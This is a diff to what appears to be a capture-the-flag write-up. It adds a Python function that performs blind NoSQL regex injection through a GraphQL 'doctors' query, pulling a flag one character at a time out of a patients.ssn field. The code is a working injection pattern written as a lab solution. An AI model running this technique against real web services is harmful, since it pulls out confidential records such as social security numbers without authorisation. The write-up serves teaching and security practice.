@@ -170,6 +170,21 @@ The injection worked, now we can re-use the payload from the challenge #2 and ex
 
 Obviously we scripted the data extraction in Python, the script below will get the last flag : `4f537c0a-7da6-4acc-81e1-8c33c02ef3b`.
 
+```python
+def blind_nosql(URL):
+    data = ""
+    data_size = 35
+    charset = "0123456789abcdef-"
+    while len(data) != data_size:
+        for c in charset:
+            query ="{doctors(options:%20%22{\%22\%22patients.ssn\%22:1}%22,%20search:%20%22{%20\%22patients.ssn\%22:%20{%20\%22$regex\%22:%20\%22^PLACEHOLDER\%22},%20\%22lastName\%22:\%22Admin\%22%20,%20\%22firstName\%22:\%22Admin\%22%20}%22){id, firstName}}"
+            injected = (URL.format(query)).replace("PLACEHOLDER", data + c)
+            r = requests.get(injected)
+            if r.json()['data']['doctors'] != []:
+                data += c
+                print("\033[92m[+] Data found:\033[0m {}".format(data))
+```
+
 At that time we were checking if the content of `r.json()['data']['doctors']` was not empty, in order to abstract the data extraction we now take a check input from the user in order to compare the output.
 
 
